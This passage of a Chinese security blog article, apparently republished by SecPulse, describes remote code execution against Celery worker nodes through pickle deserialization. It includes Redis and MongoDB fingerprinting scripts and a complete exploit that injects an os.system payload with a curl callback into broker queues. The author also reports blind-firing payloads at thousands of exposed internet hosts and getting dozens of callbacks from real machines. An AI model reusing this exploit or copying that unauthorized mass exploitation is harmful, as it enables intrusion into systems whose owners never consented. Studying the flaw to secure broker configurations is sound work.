+<p>所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs css">_<span class="hljs-tag">kombu</span><span class="hljs-class">.binding</span>.*
+<span class="hljs-tag">celery</span>.*
+<span class="hljs-tag">unacked</span>.*
+</code></pre>
+</div>
+<p>而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs css"><span class="hljs-tag">messages</span>
+<span class="hljs-tag">messages</span><span class="hljs-class">.broadcast</span>
+<span class="hljs-tag">messages</span><span class="hljs-class">.routing</span>
+</code></pre>
+</div>
+<p>其中 <code class="highlighter-rouge">messages.routing</code> 含有每一个队列以及消息路由的信息，<code class="highlighter-rouge">messages</code> 则存储了所有队列中的消息数据。</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle13.png"><img class="alignnone size-large wp-image-52173" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle13-1024x385.png" alt="pickle13" width="1024" height="385" /></a></p>
+<p>那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。</p>
+<p>针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># celery_broker_redis_check.py</span></span>
+<span class="o">...</span>
+<span class="n">CELERY_KEYS</span> <span class="o">=</span> <span class="p">[</span><span class="s"><span class="hljs-string">'celery'</span></span><span class="p">,</span> <span class="s"><span class="hljs-string">'unacked'</span></span><span class="p">,</span> <span class="s"><span class="hljs-string">'_kombu.binding'</span></span><span class="p">]</span>
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">seed</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-keyword">try</span></span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s"><span class="hljs-string">':'</span></span><span class="p">)</span>
+    <span class="k"><span class="hljs-keyword">except</span></span> <span class="nb">ValueError</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">ex</span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="p">,</span> <span class="mi"><span class="hljs-number">6379</span></span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">socket_connect_timeout</span><span class="o">=</span><span class="mi"><span class="hljs-number">5</span></span><span class="p">)</span>
+    <span class="n">keys</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">succeed</span><span class="o">=</span><span class="bp"><span class="hljs-keyword">False</span></span><span class="p">,</span> <span class="n">keys</span><span class="o">=</span><span class="nb">list</span><span class="p">())</span>
+    <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">_k</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">CELERY_KEYS</span><span class="p">:</span>
+        <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">key</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">keys</span><span class="p">:</span>
+            <span class="k"><span class="hljs-keyword">if</span></span> <span class="n">_k</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">key</span><span class="p">:</span>
+                <span class="n">info</span><span class="p">[</span><span class="s"><span class="hljs-string">'succeed'</span></span><span class="p">]</span> <span class="o">=</span> <span class="bp"><span class="hljs-keyword">True</span></span>
+                <span class="n">info</span><span class="p">[</span><span class="s"><span class="hljs-string">'keys'</span></span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">info</span>
+<span class="o">...</span>
+</code></pre>
+</div>
+<p>针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 <code class="highlighter-rouge">['celery', 'unacked', '_kombu.binding']</code> 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># celery_broker_mongodb_check.py</span></span>
+<span class="o">...</span>
+<span class="n">CELERY_COLLECTIONS</span> <span class="o">=</span> <span class="p">[</span><span class="s"><span class="hljs-string">'messages.routing'</span></span><span class="p">,</span> <span class="s"><span class="hljs-string">'messages.broadcast'</span></span><span class="p">]</span>
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">seed</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-keyword">try</span></span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s"><span class="hljs-string">':'</span></span><span class="p">)</span>
+    <span class="k"><span class="hljs-keyword">except</span></span> <span class="nb">ValueError</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">ex</span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="p">,</span> <span class="mi"><span class="hljs-number">27017</span></span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">connectTimeoutMS</span><span class="o">=</span><span class="mi"><span class="hljs-number">2000</span></span><span class="p">,</span>
+                               <span class="n">serverSelectionTimeoutMS</span><span class="o">=</span><span class="mi"><span class="hljs-number">2000</span></span><span class="p">)</span>
+    <span class="n">dbs</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">database_names</span><span class="p">()</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">succeed</span><span class="o">=</span><span class="bp"><span class="hljs-keyword">False</span></span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="nb">dict</span><span class="p">())</span>
+    <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">db</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">dbs</span><span class="p">:</span>
+        <span class="n">colnames</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">get_database</span><span class="p">(</span><span class="n">db</span><span class="p">)</span><span class="o">.</span><span class="n">collection_names</span><span class="p">()</span>
+        <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">_col</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">CELERY_COLLECTIONS</span><span class="p">:</span>
+            <span class="k"><span class="hljs-keyword">if</span></span> <span class="nb">any</span><span class="p">(</span><span class="n">_col</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">colname</span> <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">colname</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">colnames</span><span class="p">):</span>
+                <span class="n">info</span><span class="p">[</span><span class="s"><span class="hljs-string">'succeed'</span></span><span class="p">]</span> <span class="o">=</span> <span class="bp"><span class="hljs-keyword">True</span></span>
+                <span class="n">info</span><span class="p">[</span><span class="s"><span class="hljs-string">'results'</span></span><span class="p">][</span><span class="n">db</span><span class="p">]</span> <span class="o">=</span> <span class="n">colnames</span>
+                <span class="k"><span class="hljs-keyword">continue</span></span>
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">info</span>
+<span class="o">...</span>
+</code></pre>
+</div>
+<p>而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。</p>
+<h4 id="section-4"><span style="color: #ff6600;">2. 使用脚本进行消息注入攻击分布式节点</span></h4>
+<p>使用上面两个脚本在本地环境进行测试：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle14.png"><img class="alignnone size-large wp-image-52174" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle14-1024x162.png" alt="pickle14" width="1024" height="162" /></a></p>
+<p>这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 <code class="highlighter-rouge">pickle</code> 的序列化方式，<strong>若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了</strong>。</p>
+<p>一个简单的真对 Redis Broker 类型的攻击脚本：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># celery_broker_redis_exp.py</span></span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">re</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">json</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">redis</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">pickle</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">base64</span>
+
+<span class="n">evil_command</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'curl http://127.0.0.1:8000/{}'</span></span>
+
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">create_evil_task_body</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">command</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span> <span class="n"><span class="hljs-function"><span class="hljs-params">body_encoding</span></span></span><span class="o"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="s"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">'base64'</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">Command</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+        <span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="bp"><span class="hljs-function"><span class="hljs-params">self</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+            <span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">os</span>
+            <span class="k"><span class="hljs-keyword">return</span></span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="p">))</span>
+    <span class="k"><span class="hljs-keyword">if</span></span> <span class="n">body_encoding</span> <span class="o">==</span> <span class="s"><span class="hljs-string">'base64'</span></span><span class="p">:</span>
+        <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Command</span><span class="p">()))</span>
+
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">create_evil_message</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">body</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span><span class="s"><span class="hljs-string">"body"</span></span><span class="p">:</span> <span class="n">body</span><span class="p">,</span><span class="s"><span class="hljs-string">"headers"</span></span><span class="p">:</span> <span class="p">{},</span><span class="s"><span class="hljs-string">"content-encoding"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"binary"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"content-type"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"application/x-python-serialize"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"properties"</span></span><span class="p">:</span> <span class="p">{</span><span class="s"><span class="hljs-string">"body_encoding"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"base64"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"reply_to"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"correlation_id"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"delivery_info"</span></span><span class="p">:</span> <span class="p">{</span><span class="s"><span class="hljs-string">"routing_key"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"celery"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"exchange"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"celery"</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"priority"</span></span><span class="p">:</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">},</span><span class="s"><span class="hljs-string">"delivery_mode"</span></span><span class="p">:</span> <span class="mi"><span class="hljs-number">2</span></span><span class="p">,</span><span class="s"><span class="hljs-string">"delivery_tag"</span></span><span class="p">:</span> <span class="s"><span class="hljs-string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span><span class="p">}}</span>
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+
+<span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">exp</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">seed</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-keyword">try</span></span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s"><span class="hljs-string">':'</span></span><span class="p">)</span>
+    <span class="k"><span class="hljs-keyword">except</span></span> <span class="nb">ValueError</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">ex</span><span class="p">:</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">seed</span><span class="p">,</span> <span class="mi"><span class="hljs-number">6379</span></span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">socket_connect_timeout</span><span class="o">=</span><span class="mi"><span class="hljs-number">5</span></span><span class="p">)</span>
+    <span class="n">keys</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">succeed</span><span class="o">=</span><span class="bp"><span class="hljs-keyword">False</span></span><span class="p">,</span> <span class="n">keys</span><span class="o">=</span><span class="nb">list</span><span class="p">())</span>
+    <span class="k"><span class="hljs-keyword">for</span></span> <span class="n">key</span> <span class="ow"><span class="hljs-keyword">in</span></span> <span class="n">keys</span><span class="p">:</span>
+        <span class="n">matched</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s"><span class="hljs-string">r'^_kombu</span></span><span class="err"><span class="hljs-string">\</span></span><span class="s"><span class="hljs-string">.binding</span></span><span class="err"><span class="hljs-string">\</span></span><span class="s"><span class="hljs-string">.(?P&lt;queue&gt;.*)'</span></span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+        <span class="k"><span class="hljs-keyword">if</span></span> <span class="n">matched</span><span class="p">:</span>
+            <span class="n">queue_name</span> <span class="o">=</span> <span class="n">matched</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s"><span class="hljs-string">'queue'</span></span><span class="p">)</span>
+            <span class="n">message</span> <span class="o">=</span> <span class="n">create_evil_message</span><span class="p">(</span>
+                <span class="n">create_evil_task_body</span><span class="p">(</span><span class="n">evil_command</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">queue_name</span><span class="p">))</span>
+            <span class="p">)</span>
+            <span class="n">r</span><span class="o">.</span><span class="n">lpush</span><span class="p">(</span><span class="n">queue_name</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
+
+<span class="n">exp</span><span class="p">(</span><span class="s"><span class="hljs-string">'192.168.99.100'</span></span><span class="p">)</span>
+</code></pre>
+</div>
+<p>为了测试攻击脚本，首先需要在 <code class="highlighter-rouge">192.168.99.100</code> 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：</p>
+<div class="highlighter-rouge">
+<pre class="highlight"><code class="hljs nginx"><span class="hljs-title">celery</span> worker --broker=<span class="hljs-string">'redis://:@192.168.99.100/0'</span>
+</code></pre>
+</div>
+<p>整个过程演示：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle15.gif"><img class="alignnone size-full wp-image-52175" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle15.gif" alt="pickle15" width="960" height="503" /></a></p>
+<p>可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。</p>
+<h2 id="section-5">四、互联网案例检测</h2>
+<p>上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：</p>
+<ol>
+<li>找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；</li>
+<li>往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 <code class="highlighter-rouge">pickle</code> 方式序列化，所以会进行 Payload 盲打；</li>
+<li>等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；</li>
+</ol>
+<p>首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有 <strong>14000+</strong> 个，而未授权访问的 MongoDB 同样也有 <strong>14000+</strong> 个。</p>
+<p>针对 <strong>14000+</strong> 个存在未授权访问的 Redis 服务使用上一节的验证脚本（<code class="highlighter-rouge">celery_broker_redis_check.py</code>）进行批量检测，得到了 <strong>86</strong> 个目标满足要求，扫描过程截图：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle16.png"><img class="alignnone size-large wp-image-52176" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle16-1024x580.png" alt="pickle16" width="1024" height="580" /></a></p>
+<p>同样的针对 <strong>14000+</strong> 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 <strong>22</strong> 个目标满足要求，扫描过程截图：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle17.png"><img class="alignnone size-large wp-image-52177" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle17-1024x579.png" alt="pickle17" width="1024" height="579" /></a></p>
+<p>根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。</p>
+<p>由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。</p>
+<p>针对 Redis 检测过程截图：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle18.png"><img class="alignnone size-large wp-image-52178" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle18-1024x312.png" alt="pickle18" width="1024" height="312" /></a></p>
+<p>其中服务器上收到了 <strong>32</strong> 个成功执行命令并回连的请求：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle19.png"><img class="alignnone size-large wp-image-52179" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle19-1024x306.png" alt="pickle19" width="1024" height="306" /></a></p>
+<p>同样的针对 MongoDB 检测过程截图：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle20.png"><img class="alignnone size-large wp-image-52180" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle20-1024x290.png" alt="pickle20" width="1024" height="290" /></a></p>
+<p>其中服务器上成功收到 <strong>3</strong> 个成功执行命令并回连的请求：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle21.png"><img class="alignnone size-large wp-image-52181" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle21-1024x159.png" alt="pickle21" width="1024" height="159" /></a></p>
+<p>从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。</p>
+<p><span style="color: #008000;"><strong>（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）</strong></span></p>
+<h3 id="section-6">相关链接</h3>
+<ul>
+<li><a href="http://www.celeryproject.org/">Celery 分布式框架项目 - http://www.celeryproject.org/</a></li>
+<li><a href="https://docs.python.org/2/library/pickle.html">Python “pickle” 模块文档 - https://docs.python.org/2/library/pickle.html</a></li>
+<li><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html">Django 远程命令执行漏洞详解 - http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></li>
+</ul>
+</div>
+<div id="disqus_thread"></div>
+<p><strong>【原文：</strong><a href="http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank">漏洞组合拳 - 攻击分布式节点 </a>   <strong>本文作者：</strong>rickgray     <strong>安全脉搏整理发布】</strong></p>
+		<div class="pageShenming">
+【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
+<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/activemq" rel="tag">ActiveMQ</a><a href="https://www.secpulse.com/archives/tag/celery-%e5%88%86%e5%b8%83%e5%bc%8f%e6%a1%86%e6%9e%b6" rel="tag">Celery 分布式框架</a><a href="https://www.secpulse.com/archives/tag/django-%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e8%af%a6%e8%a7%a3" rel="tag">Django 远程命令执行漏洞详解</a><a href="https://www.secpulse.com/archives/tag/kafka" rel="tag">kafka</a><a href="https://www.secpulse.com/archives/tag/python%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e5%ae%89%e5%85%a8" rel="tag">Python序列化的安全</a><a href="https://www.secpulse.com/archives/tag/rabbitmq" rel="tag">RabbitMQ</a><a href="https://www.secpulse.com/archives/tag/redis" rel="tag">redis</a><a href="https://www.secpulse.com/archives/tag/rickgray" rel="tag">RickGray</a><a href="https://www.secpulse.com/archives/tag/%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f" rel="tag">分布式系统</a><a href="https://www.secpulse.com/archives/tag/%e6%94%bb%e5%87%bb%e5%88%86%e5%b8%83%e5%bc%8f%e8%8a%82%e7%82%b9" rel="tag">攻击分布式节点</a><a href="https://www.secpulse.com/archives/tag/%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" rel="tag">未授权访问</a><a href="https://www.secpulse.com/archives/tag/%e6%b6%88%e6%81%af%e9%98%9f%e5%88%97%e4%b8%ad%e9%97%b4%e4%bb%b6" rel="tag">消息队列中间件</a><a href="https://www.secpulse.com/archives/tag/%e6%bc%8f%e6%b4%9e%e7%bb%84%e5%90%88%e6%8b%b3" rel="tag">漏洞组合拳</a></div>
+		</div>
+	<!-- .single-content -->
+		<div class="pageActive">
+	<div class="mark-like-btn">
+							</div>
+	<!-- Baidu Button BEGIN -->
+	<div class="bdshare">
+		<div class="bdsharebuttonbox">
+			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
+				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
+				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
+				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+		</div>
+		<script>
+		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
+		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+		</script>
+
+	</div>
+</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
+		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>
+
+	<ul class="related_post">
+				<li><a href="https://www.secpulse.com/archives/60064.html" title="详细阅读 Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/08/active-mq1.png&h=150&w=249&zc=1" alt="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析" class="xg-img"/>
+		<p>Apache ActiveMQ 远程代码&hellip;</P></a></li>
+				<li><a href="https://www.secpulse.com/archives/54880.html" title="详细阅读 渗透测试中常见的端口">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/01/malware.jpg&h=150&w=249&zc=1" alt="渗透测试中常见的端口" class="xg-img"/>
+		<p>渗透测试中常见的端口</P></a></li>
+				<li><a href="https://www.secpulse.com/archives/50173.html" title="详细阅读 DaoCloud某处弱口令(疑似测试环境)+docker remote API未授权访问">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/upload/201607/091157407b1f4756f14404944559ddd2a163acb2.png&h=150&w=249&zc=1" alt="DaoCloud某处弱口令(疑似测试环境)+docker remote API未授权访问" class="xg-img"/>
+		<p>DaoCloud某处弱口令(疑似测试环境&hellip;</P></a></li>
+			</ul>
+
+
+</section></article>
+
+
+<!-- 引用 -->
+<div id="comments" class="comments-area">
+		<h2 class="comments-title">
+		1条评论
+	</h2>
+<!-- 显示正在加载新评论 -->
+ <div id="loading-comments"><span>评论加载中，请稍等...</span></div>
+	<ul class="commentlist">
+			
+	<li class="comment byuser comment-author-huangwenhuai even thread-even depth-1" id="comment-7027">
+	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="40" height="40" alt="" class="avatar avatar-40wp-user-avatar wp-user-avatar-40 alignnone photo avatar-default" /></div>
+			<div id="div-comment-7027" class="commenttext">
+		<div class="commentmeta">
+		
+		<!--<cite class="fn">huangwenhuai</cite> <span class="says">:</span>-->
+		<span class="commentid">huangwenhuai</span>
+		<span class="comment-meta commentmetadata">
+			<a href="https://www.secpulse.com/archives/52116.html#comment-7027"></a>
+			<span class="commenttime">
+				2016年10月20日 下午6:36											
+				</span>
+			</span>
+			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/52116.html?replytocom=7027#respond' onclick='return addComment.moveForm( "comment-7027", "7027", "respond", "52116" )' aria-label='回复给huangwenhuai'>回复</a></span>
+		</span>
+	</div>
+	<div class="commentp"><p>楼主哦若若的问下我们<br />
+三、利用脆弱的 Broker 代理进行分布式节点攻击<br />
+的插图是用哪个软件画的啊</p>
+</div>
+			</div>
+	</li><!-- #comment-## -->
+	</ul><!-- .comment-list -->
+
+			<div id="respond" class="comment-respond row">
+		
+
+
+			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
+		
+				
+						
